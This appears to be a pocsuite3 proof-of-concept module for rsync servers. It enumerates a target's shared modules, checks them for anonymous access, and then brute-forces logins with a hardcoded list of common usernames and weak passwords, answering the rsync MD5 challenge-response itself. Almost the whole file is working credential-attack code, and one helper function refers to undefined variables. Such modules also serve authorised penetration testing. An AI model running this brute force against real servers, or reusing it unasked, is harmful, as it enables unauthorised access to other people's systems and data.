# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import itertools
import socket
import queue
import re
import time
import hashlib
from base64 import b64encode
import traceback

rsync_username=['admin','Administrator','root','rsync']
rsync_password=['admin','123456','12345','admin123']

class RsyncWeakpassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 15, 2020'
    createDate = 'Aug 15, 2020'
    name = 'rsync弱口令'
    appName = 'rysnc'
    appVersion = 'v1.0.0'
    vulType = ''
    protocol = 'rsync'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 873 
        result = {}
        rsync_burst(host,int(port))
        if not result_queue.empty():
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['extra'] = []
        while not result_queue.empty():
            path, username, password = result_queue.get()
            result['extra'].append(path+':'+username+';'+password)
        return self.parse_output(result)
    def _attack(self):
        return self._verify()


task_queue = queue.Queue()
result_queue = queue.Queue()


def get_word_list():
    return itertools.product(rsync_username,rsync_password)

def port_check(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connect = s.connect_ex((host, int(port)))
        if connect == 0:
            return True
    except:
        pass
    finally:
        s.close()
    return False

def check_anonymous(host,port,path,timeout=20):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        socket.setdefaulttimeout(timeout)
        sock.connect((host, int(port)))
        sock.send(b'@RSYNCD: 31\n')
        res = sock.recv(1024)
        payload = path+'\n'
        logger.info(payload)
        sock.send(payload.encode())
        result = sock.recv(1024).decode('utf-8')
        if result == '\n':
            logger.info(3333)
            result = sock.recv(1024)
        if result.startswith('@RSYNCD: OK'):
            return True
    except Exception as e:
        logger.info('22222222222')
        logger.info(str(e))
        pass
    finally:
        sock.close()
    return False


def get_pathes(host,port,timeout=10):
    path_name_list = []
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        socket.setdefaulttimeout(timeout)
        sock.connect((host, int(port)))
        sock.send(b'@RSYNCD: 31\n')
        res = sock.recv(1024)
        sock.send(b'\n')
        time.sleep(0.5)
        result = sock.recv(1024).decode('utf-8')
        if result:
            for path_name in re.split('\n', result):
                if path_name and not path_name.startswith('@RSYNCD: '):
                    path_name_list.append(path_name.split('\t')[0].strip())
    except Exception as e:
        logger.info(str(e))
        pass
    finally:
        sock.close()
    return path_name_list

def _check_path_unauth(sock,path,timeout=20):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        socket.setdefaulttimeout(timeout)
        sock.connect((host, int(port)))
        sock.send(b'@RSYNCD: 31\n')
        res = sock.recv(1024)
        sock.send(path.encode())
        result = sock.recv(1024).decode('utf-8')
        if result.startswith('@RSYNCD: OK'):
            return True
    except Exception as e:
        logger.info(str(e))
    finally:
        socket.close()
    return False

def task_init(host,port,pathes):
    for path in pathes:
        for username,password in get_word_list():
            task_queue.put((host, port,path, username.strip(), password.strip()))

def task_thread():
    while not task_queue.empty():
        try:
            host,port,path,username,password = task_queue.get()
            logger.info('try burst {}:{}/{} use username:{} password:{}'.format(
                host, port,path, username, password))
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket.setdefaulttimeout(10)
            sock.connect((host, int(port)))
            sock.send(b'@RSYNCD: 31\n')
            res = sock.recv(1024)
            payload = path+'\n'
            sock.send(payload.encode())
            result = sock.recv(1024).decode()
            if result == '\n':
                result = sock.recv(1024).decode()
            if result:
                hash_o = hashlib.md5()
                hash_o.update(password.encode())
                # tmp = result[18:]
                hash_o.update(result[18:].rstrip('\n').encode())
                auth_string = b64encode(hash_o.digest()).decode()
                # logger.info(auth_string)
                send_data = username + ' ' + auth_string.rstrip('==') + '\n'
                sock.send(send_data.encode())
                res = sock.recv(1024).decode()
                if res.startswith('@RSYNCD: OK'):
                    # logger.info(''.join([path, username, password]))
                    return result_queue.put((path, username, password))
        except Exception as e:
            logger.info(str(e))
            traceback.print_exc()
            pass
        finally:
            sock.close()

        
        

def rsync_burst(host,port):
    if not port_check(host,port):
        logger.info(f'{host}:{port} not alive')
        return
    pathes = get_pathes(host,port)
    if len(pathes) == 0:
        logger.info(f'{host}:{port} no alive path')
        return
    for path in pathes:
        if check_anonymous(host,port,path):
            result_queue.put((path,'<empty>','<empty>'))
    if not result_queue.empty():
        return
    # burst
    logger.info('BEGIN BURST')
    try:
        task_init(host,port,pathes)
        run_threads(20,task_thread)
    except Exception as e:
        logger.info(str(e))
        pass

register_poc(RsyncWeakpassPOC)